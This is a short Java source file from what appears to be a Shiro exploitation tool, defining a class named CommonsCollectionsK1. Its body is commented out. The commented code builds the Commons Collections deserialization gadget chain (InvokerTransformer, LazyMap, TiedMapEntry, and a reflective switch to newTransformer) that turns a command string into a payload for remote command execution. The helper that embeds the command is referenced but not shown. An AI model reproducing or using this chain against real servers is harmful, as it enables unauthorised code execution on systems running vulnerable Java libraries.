package com.y5neko.shiroexp.gadget;

public class CommonsCollectionsK1 {
    /**
     * 反射设置字段值
     * @param obj 要操作的对象
     * @param fieldName 字段名称
     * @param value 字段值
     */
//    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
//        Field field = obj.getClass().getDeclaredField(fieldName);
//        field.setAccessible(true);
//        field.set(obj, value);
//    }
//
//    public static Map getObject(final String command) throws Exception {
//        Object tpl = createTemplatesImpl(command);
//        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
//
//        HashMap<String, String> innerMap = new HashMap<String, String>();
//        Map m = LazyMap.decorate(innerMap, transformer);
//
//        Map outerMap = new HashMap();
//        TiedMapEntry tied = new TiedMapEntry(m, tpl);
//        outerMap.put(tied, "t");
//        // clear the inner map data, this is important
//        innerMap.clear();
//
//        setFieldValue(transformer, "iMethodName", "newTransformer");
//        return outerMap;
//    }
//
//    public static void main(String[] args) throws Exception {
//        System.out.println(getObject("test"));
//    }
}
